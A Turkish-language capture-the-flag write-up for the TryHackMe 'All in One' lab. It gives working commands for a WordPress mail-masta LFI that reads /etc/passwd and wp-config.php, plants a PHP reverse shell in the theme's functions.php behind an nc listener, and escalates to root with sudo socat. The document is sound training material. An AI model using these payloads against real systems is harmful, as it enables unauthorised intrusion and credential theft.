# TryHackMe — All in One

> **Zorluk:** Easy (pratikte orta — çok vektörlü, bol çıkmaz sokak)
> **Hedef:** Tek bilgi: bir IP. "Hack it."
> **Zincir:** `mail-masta LFI → wp-config DB creds → WP admin → functions.php reverse shell → www-data → gizli dosyadan elyana şifresi → sudo socat (GTFOBins) → root`

Bu kutunun güzel tarafı: tek yol yok ve denediğin yolların çoğu **kapalı**. Asıl öğrettiği şey teknik değil, **tıkanınca pivot edebilmek**. Bu writeup bilerek denenip tutmayan yolları da içeriyor — gerçek metodoloji budur.

---

## 1. Recon — Nmap

```bash
nmap -sC -sV -Pn <IP> -oN scan.txt
```

Üç açık port:

| Port | Servis | Sürüm | Not |
|------|--------|-------|-----|
| 21/tcp | FTP | vsftpd 3.0.5 | Anonymous login allowed (230) |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu | Modern, giriş noktası değil |
| 80/tcp | HTTP | Apache 2.4.41 | Varsayılan "It works" sayfası |

> **Not:** vsftpd 3.0.5 güvenli — meşhur backdoor **2.3.4**'teydi. Buradaki zafiyet sürümde değil, **anonymous erişim yanlış yapılandırması**.

---

## 2. Enumeration

### FTP (anonymous) — çıkmaz
```bash
ftp <IP>   # anonymous / boş parola → 230 Login successful
ls -la     # dizin BOŞ, üstelik write yok (drwxr-xr-x, owner root)
```
Anonymous açık ama içi boş + yazılamaz. Bulgu olarak rapora yazılır, loot yok.

### Web — gizli dizin taraması
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
→ **`/wordpress`** (301). Default sayfanın arkasında bir WordPress sitesi.

### WPScan
```bash
wpscan --url http://<IP>/wordpress/ --enumerate u,ap
```
Çıkanlar:
- **Kullanıcı:** `elyana`
- **Plugin:** `mail-masta 1.0` (2014!) ve `reflex-gallery 3.1.7`
- WordPress 5.5.1, XML-RPC açık, uploads dizin listeleme açık

> **Metodoloji notu:** Versiyon (Apache 2.4.41) görünce hemen CVE'ye koşma. Zafiyet genelde yazılımın kendisinde değil, **üstünde çalışan uygulamada/eski plugin'de** olur. Burada da öyle.

---

## 3. Denenen ama TUTMAYAN yollar (dürüst kısım)

Bu instance web sunucusunun diske yazmasını engelliyor. Hepsi denendi, hepsi başarısız:

| Yol | Sonuç |
|-----|-------|
| reflex-gallery arbitrary file upload (manuel + Metasploit) | 200 boş döndü, dosya düşmedi ("Unable to deploy payload") |
| FTP `put` | `553 Could not create file` |
| WP Theme Editor 404.php kaydet | "File edited successfully" diyor ama **loopback kontrolü değişikliği geri alıyor** |
| WP plugin upload (`wp_admin_shell_upload`) | Auth OK, "Failed to upload the payload" |
| LFI wrapper `php://input` / `data://` | Boş — `allow_url_include=Off` |
| Apache log poisoning | access.log `root:adm`, www-data okuyamıyor |

Ders: tek bir "işe yaramayan" exploit seni durdurmamalı. Yan yana birçok vektör dene, hangisi açılırsa oradan git.

---

## 4. Foothold — LFI ile DB creds, sonra WP admin

### mail-masta LFI (çalışan vektör)
`mail-masta` eklentisi `pl` parametresini kontrolsüz `include` ediyor:
```bash
curl "http://<IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
`/etc/passwd` döküldü → sistem kullanıcıları: **`elyana`** (`/bin/bash`, home var) ve `ubuntu`.

### wp-config.php okuma (php://filter)
PHP dosyasını düz include edersek kod **çalışır**, içerik görünmez. Kaynağı okumak için `php://filter` ile base64'leyip çıkarıyoruz (bu wrapper `allow_url_include` gerektirmez):
```bash
curl "http://<IP>/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php"
```
Dönen base64'ü çöz:
```bash
echo '<base64>' | base64 -d
```
```php
define( 'DB_USER', 'elyana' );
define( 'DB_PASSWORD', 'H@ckme@123' );
```
`H@ckme@123` SSH'ta ve ilk denemede tutmadı → ama **WordPress admin** parolası (elyana / H@ckme@123). Panel: `wp-login.php`.

### WP admin → RCE (functions.php)
Theme Editor 404.php'de loopback geri alma sorunu yaşanıyor. Çözüm: **`functions.php`** — her sayfa yüklenişinde otomatik çalışır, ayrı tetiklemeye gerek yok (WP'nin kendi loopback kontrolü bile tetikler).

`Appearance → Theme File Editor → Twenty Twenty → functions.php` içine PHP reverse shell (pentestmonkey, `$ip`/`$port` kendi IP'n). Dinleyici:
```bash
nc -lvnp 4444
```
Tetikleme (olmayan sayfa → aktif tema çalışır):
```bash
curl http://<IP>/wordpress/boyle-sayfa-yok
```
→ `www-data` shell geldi. TTY düzelt:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 5. User — gizli parolayı bulma

`/home/elyana/user.txt` → `-rw-------` (www-data okuyamaz). Ama `hint.txt` herkese açık:
> *"Elyana's user password is hidden in the system. Find it ;)"*

elyana'ya ait, bizim okuyabileceğimiz dosyaları ara:
```bash
find / -type f -user elyana 2>/dev/null
```
→ `/etc/mysql/conf.d/private.txt` (sinsi yer!):
```
user: elyana
password: E@syR18ght
```
```bash
su elyana        # parola: E@syR18ght
cat /home/elyana/user.txt   # base64 → echo '<b64>' | base64 -d → THM{...}
```

---

## 6. Privilege Escalation — sudo socat (GTFOBins)

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/socat
```
elyana, `socat`'ı root olarak şifresiz çalıştırabiliyor → [GTFOBins socat sudo](https://gtfobins.github.io/gtfobins/socat/):
```bash
sudo socat stdin exec:/bin/bash
id        # uid=0(root)
cat /root/root.txt   # base64 → decode → THM{...}
```
**Root. 🏁**

---

## Özet akış
